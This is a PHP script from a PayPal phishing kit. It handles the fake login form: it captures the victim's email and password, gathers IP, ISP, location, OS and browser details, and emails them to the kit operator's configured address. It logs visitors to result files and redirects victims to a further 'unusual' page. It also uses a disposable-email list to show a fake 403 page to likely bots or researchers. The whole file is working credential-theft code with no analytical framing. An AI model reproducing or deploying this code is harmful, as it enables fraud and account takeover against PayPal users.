<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['login_email'] == "") {
	exit();
}
function load_dispose() {
    $data = file_get_contents("../security/dispose.dat");
    if(strcasecmp(substr(PHP_OS, 0, 3), 'WIN') == 0){
    $data = explode("\r\n", $data);
  }else{
    $data = explode("\n", $data);
  }
    return $data;
}
$disposeemail = load_dispose();
foreach ($disposeemail as $emailbot) {
      if (substr_count($_POST['login_email'], $emailbot) > 0) {
        tulis_file("../security/onetime.dat","$ip");
          header('HTTP/1.0 403 Forbidden');
          die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
        }
}
$ip = getUserIP();
$message  = "#--------------------[ PAYPAL LOGIN ]-------------------------#\n";
$message .= "User ID		: ".$_POST['login_email']."\n";
$message .= "Password		: ".$_POST['login_password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$_SESSION['login_email'] = $_POST['login_email'];
$_SESSION['login_password'] = $_POST['login_password'];
$subject = "PAYPAL LOGIN: ".$_POST['login_email']." [ $cn - $os - $ip ]";
if($setting['send_login'] == "on") {
kirim_mail($setting['email_result'], "PP Login", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Paypal");
echo "<script type='text/javascript'>window.top.location='unusual?key=$key';</script>";
